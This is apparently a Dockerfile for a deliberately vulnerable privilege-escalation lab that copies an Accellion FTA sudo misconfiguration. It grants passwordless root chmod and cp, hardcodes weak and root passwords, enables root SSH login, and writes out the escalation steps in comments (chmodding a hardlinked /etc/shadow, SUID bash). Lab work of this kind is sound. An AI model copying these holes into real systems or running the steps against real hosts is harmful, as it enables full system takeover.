FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_chmod (Accellion FTA style)
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /bin/chmod as root
# without password. Attacker can hardlink sensitive files and chmod them,
# or directly chmod /etc/shadow, /etc/passwd, or SUID a shell.
# Based on CVE-2009-4648 / OSVDB-62522 exploit pattern:
#   ln /etc/shadow /home/lowpriv/oldtemp
#   sudo /bin/chmod 666 /home/lowpriv/oldtemp
# Or more directly: sudo /bin/chmod u+s /bin/bash
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and coreutils (provides chmod, cp, ln)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        coreutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify chmod is installed
RUN which chmod && ls -la /bin/chmod

# Create low-privilege user (simulating the "admin" user from the Accellion appliance)
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# Mimics the Accellion FTA misconfiguration where a restricted user
# could run /bin/chmod and /bin/cp as root without password.
# The exploit:
#   1) ln /etc/shadow /home/lowpriv/oldtemp
#      sudo /bin/chmod 666 /home/lowpriv/oldtemp
#      (now /etc/shadow is world-readable/writable, edit root password)
#   2) Or simply: sudo /bin/chmod u+s /bin/bash
#      then: /bin/bash -p  -> root shell
RUN echo "lowpriv ALL=(root) NOPASSWD: /bin/chmod *" > /etc/sudoers.d/accellion && \
    echo "lowpriv ALL=(root) NOPASSWD: /bin/cp *" >> /etc/sudoers.d/accellion && \
    chmod 440 /etc/sudoers.d/accellion

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]